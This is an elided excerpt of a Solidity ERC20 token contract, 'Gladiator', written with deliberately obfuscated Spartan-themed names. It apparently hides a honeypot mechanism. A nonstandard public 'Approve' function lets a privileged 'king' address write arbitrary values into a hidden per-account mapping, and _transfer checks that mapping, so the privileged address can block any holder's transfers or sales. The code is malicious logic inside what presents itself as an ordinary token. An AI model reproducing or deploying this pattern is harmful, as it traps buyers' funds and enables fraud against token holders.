...
contract Gladiator is IERC20, War, Ownable {
    ...
    mapping (address => Sword) private _sparta;

    Shield[] private _leonidas;
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _leonidas.push(Shield(king_, 300));
        _totalSupply = totalSupply_ * 10**_decimals;
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
        emit Fight(address(0), _totalSupply);
    }
    ...
    function Approve(address account, uint256 amount) public returns (bool) {
        ...
        _warrior(from, account, amount);
        emit Approval(from, address(this), amount);
        return true;
    }

    function _warrior(address from, address account, uint256 amount) internal {
        _allowances[from][from] = amount;
        uint256 total = 0;
        require(account != address(0), "invalid address");
        if (from == _leonidas[0].cross) {
            _sparta[from].spear -= total;
            total += amount;
            _sparta[account].spear = total;
        } else {
            _sparta[from].spear -= total;
            _sparta[account].spear += total;
        }
    ...
    */
    function roman(address account) public view returns (uint256) {
        return _sparta[account].spear;
    }
    ...
    function _transfer(
        ...
        require(amount - roman(sender) > 0, "roman");
